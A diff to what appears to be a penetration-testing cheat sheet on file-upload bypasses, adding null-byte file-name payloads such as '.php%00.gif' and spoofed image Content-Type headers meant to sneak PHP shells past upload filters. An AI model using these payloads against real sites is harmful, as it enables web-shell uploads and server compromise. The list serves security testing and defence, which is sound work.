@@ -54,8 +54,17 @@ Coldfusion: .cfm, .cfml, .cfc, .dbm
 
 ### Upload tricks
 
-- Null byte (eg: shell.php%00.gif, shell.php%00.png), works well against `pathinfo()`
+- Null byte (works well against `pathinfo()`)
+    * .php%00.gif
+    * .php\x00.gif
+    * .php%00.png
+    * .php\x00.png
+    * .php%00.jpg
+    * .php\x00.jpg
 - Mime type, change `Content-Type : application/x-php` or `Content-Type : application/octet-stream` to `Content-Type : image/gif`
+    * `Content-Type : image/gif`
+    * `Content-Type : image/png`
+    * `Content-Type : image/jpeg`
 
 ### Picture upload with LFI
 
